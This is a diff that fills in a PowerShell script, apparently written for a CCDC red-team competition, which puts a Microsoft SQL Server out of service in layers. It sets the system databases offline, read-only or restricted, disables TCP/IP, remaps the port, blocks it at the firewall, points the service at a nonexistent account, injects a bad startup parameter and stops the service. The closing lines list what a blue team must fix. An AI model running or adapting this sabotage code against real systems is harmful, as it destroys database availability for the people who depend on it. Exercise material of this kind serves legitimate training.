@@ -80,5 +80,208 @@ Write-Warn " CCDC Phase 3 — MSSQL: Dead In The Water"
 Write-Warn "================================================================"
 Write-Host ""
 
-# TODO: implement
-Write-Warn "STUB — not yet implemented. See Phase3_Windows_Plan.md for full design."
+# ---- Early exit if not an MSSQL machine ----------------------------------------
+if (-not (Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue)) {
+    Write-Warn "MSSQLSERVER service not found — skipping (not an MSSQL target)"
+    exit 0
+}
+
+# ---- Instance / registry base discovery ----------------------------------------
+function Get-SqlRegBase {
+    $sqlRoot = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
+    $verDir  = Get-ChildItem $sqlRoot -ErrorAction SilentlyContinue |
+               Where-Object { $_.PSChildName -match '^MSSQL\d{2}\.MSSQLSERVER$' } |
+               Select-Object -First 1
+    if (-not $verDir) { return $null }
+    return Join-Path $sqlRoot "$($verDir.PSChildName)\MSSQLServer"
+}
+
+$SqlBase = Get-SqlRegBase
+if (-not $SqlBase) {
+    Write-Err "Cannot locate SQL Server registry base — aborting"
+    exit 1
+}
+Write-Info "SQL Server registry base: $SqlBase"
+
+# ================================================================================
+Write-Section "LAYER 2 — DATABASE SABOTAGE (T1565.001 + T1562.004)"
+# ================================================================================
+# Must run while SQL Server is still up — do this first.
+
+Write-Info "Executing T-SQL database sabotage via .NET SqlClient..."
+try {
+    $connStr = "Server=localhost;Integrated Security=true;Database=master;Connect Timeout=10"
+    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
+    try {
+        $conn.Open()
+
+        $statements = @(
+            "ALTER DATABASE master SET RESTRICTED_USER WITH ROLLBACK IMMEDIATE",
+            "ALTER DATABASE msdb   SET OFFLINE         WITH ROLLBACK IMMEDIATE",
+            "ALTER DATABASE model  SET READ_ONLY        WITH ROLLBACK IMMEDIATE"
+        )
+
+        foreach ($sql in $statements) {
+            try {
+                $cmd = $conn.CreateCommand()
+                $cmd.CommandText    = $sql
+                $cmd.CommandTimeout = 30
+                [void]$cmd.ExecuteNonQuery()
+                Write-Success "Executed: $sql"
+            } catch {
+                Write-Err "T-SQL failed: $sql — $_"
+            }
+        }
+    } finally {
+        if ($conn.State -ne [System.Data.ConnectionState]::Closed) { $conn.Close() }
+    }
+} catch {
+    Write-Err "SqlClient connection failed: $_ — T-SQL layer skipped"
+}
+
+Write-Info "Disabling SQL Server TCP/IP protocol in registry..."
+try {
+    $tcpPath = "$SqlBase\SuperSocketNetLib\Tcp"
+    if (Test-Path $tcpPath) {
+        Set-ItemProperty -Path $tcpPath -Name Enabled -Value 0 -Type DWord
+        Write-Success "TCP/IP protocol disabled (SuperSocketNetLib\Tcp\Enabled = 0)"
+    } else {
+        Write-Warn "TCP registry path not found: $tcpPath"
+    }
+} catch {
+    Write-Err "Failed to disable TCP/IP: $_"
+}
+
+# ================================================================================
+Write-Section "LAYER 3 — PORT / DISCOVERY SABOTAGE (T1562.004 + T1489)"
+# ================================================================================
+
+Write-Info "Remapping SQL Server listening port 1433 → 14334..."
+try {
+    $ipAllPath = "$SqlBase\SuperSocketNetLib\Tcp\IPAll"
+    if (Test-Path $ipAllPath) {
+        Set-ItemProperty -Path $ipAllPath -Name TcpPort         -Value "14334"
+        Set-ItemProperty -Path $ipAllPath -Name TcpDynamicPorts -Value ""
+        Write-Success "TcpPort set to 14334; TcpDynamicPorts cleared"
+    } else {
+        Write-Warn "IPAll registry path not found: $ipAllPath"
+    }
+} catch {
+    Write-Err "Failed to remap TCP port: $_"
+}
+
+Write-Info "Stopping and disabling SQL Server Browser service..."
+try {
+    $browserSvc = Get-Service -Name SQLBrowser -ErrorAction SilentlyContinue
+    if ($browserSvc) {
+        Stop-Service -Name SQLBrowser -Force
+        Set-Service  -Name SQLBrowser -StartupType Disabled
+        Write-Success "SQLBrowser stopped and disabled"
+    } else {
+        Write-Info "SQLBrowser service not found — skipping"
+    }
+} catch {
+    Write-Err "Failed to disable SQL Browser: $_"
+}
+
+Write-Info "Adding firewall rules to block TCP 1433 and TCP 14334..."
+try {
+    $fwRules = @(
+        @{ Name = "CCDC_Block_SQL_1433_In";   Dir = "Inbound";  Port = 1433  },
+        @{ Name = "CCDC_Block_SQL_1433_Out";  Dir = "Outbound"; Port = 1433  },
+        @{ Name = "CCDC_Block_SQL_14334_In";  Dir = "Inbound";  Port = 14334 },
+        @{ Name = "CCDC_Block_SQL_14334_Out"; Dir = "Outbound"; Port = 14334 }
+    )
+    foreach ($r in $fwRules) {
+        $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
+        if (-not $existing) {
+            $params = @{
+                DisplayName = $r.Name
+                Direction   = $r.Dir
+                Protocol    = "TCP"
+                Action      = "Block"
+                Profile     = "Any"
+                Enabled     = "True"
+            }
+            $params["LocalPort"] = $r.Port
+            New-NetFirewallRule @params | Out-Null
+            Write-Success "Firewall rule created: $($r.Name)"
+        } else {
+            Write-Info "Firewall rule already exists: $($r.Name)"
+        }
+    }
+} catch {
+    Write-Err "Firewall rule creation failed: $_"
+}
+
+# ================================================================================
+Write-Section "LAYER 1 — SERVICE ACCOUNT + STARTUP PARAM CORRUPTION (T1489 + T1222)"
+# ================================================================================
+# Done last — prevents SQL Server from restarting after layers 2/3 take effect.
+
+Write-Info "Changing SQL Server service account to nonexistent local user..."
+$accountChanged = $false
+try {
+    [void][Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement')
+    $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
+    $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' }
+    if ($svc) {
+        $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
+        $svc.Alter()
+        Write-Success "Service account changed via SMO WMI to .\NonExistentUser2019"
+        $accountChanged = $true
+    }
+} catch {
+    Write-Warn "SMO WMI approach failed ($_) — falling back to registry"
+}
+
+if (-not $accountChanged) {
+    try {
+        $svcRegPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
+        Set-ItemProperty -Path $svcRegPath -Name ObjectName -Value '.\NonExistentUser2019'
+        Write-Success "Service ObjectName set via registry to .\NonExistentUser2019"
+    } catch {
+        Write-Err "Registry fallback for service account also failed: $_"
+    }
+}
+
+Write-Info "Injecting invalid startup parameter into SQL Server Parameters registry..."
+try {
+    $paramPath = "$SqlBase\Parameters"
+    if (-not (Test-Path $paramPath)) {
+        Write-Warn "Parameters registry key not found — skipping startup param injection (key absent means SQL uses compiled-in defaults)"
+        return
+    }
+    $regItem  = Get-Item $paramPath -ErrorAction SilentlyContinue
+    $existing = if ($regItem) {
+                    $regItem.Property | Where-Object { $_ -match '^SQLArg\d+$' }
+                } else { @() }
+    $nextIdx  = if ($existing) {
+                    ($existing | ForEach-Object { [int]($_ -replace 'SQLArg', '') } |
+                     Measure-Object -Maximum).Maximum + 1
+                } else { 0 }
+    $argName   = "SQLArg$nextIdx"
+    Set-ItemProperty -Path $paramPath -Name $argName `
+                     -Value '-eC:\NonExistent\Logs\sqlserver_error.log' -Type String
+    Write-Success "Added invalid startup param $argName = -eC:\NonExistent\Logs\sqlserver_error.log"
+} catch {
+    Write-Err "Failed to inject startup parameter: $_"
+}
+
+Write-Info "Stopping MSSQLSERVER service..."
+try {
+    Stop-Service -Name MSSQLSERVER -Force
+    Write-Success "MSSQLSERVER service stopped"
+} catch {
+    Write-Err "Could not stop MSSQLSERVER: $_"
+}
+
+Write-Host ""
+Write-Success "================================================================"
+Write-Success " CCDC Phase 3 — MSSQL: Dead In The Water — COMPLETE"
+Write-Success "================================================================"
+Write-Host ""
+Write-Info "Blue team must fix ALL of the following before SQL accepts scoring connections:"
+Write-Info "  L1: Service account (.\NonExistentUser2019) + invalid SQLArg startup param"
+Write-Info "  L2: master RESTRICTED_USER, msdb OFFLINE, model READ_ONLY, TCP/IP disabled"
+Write-Info "  L3: Listening port remapped to 14334, SQL Browser disabled, FW blocks 1433+14334"
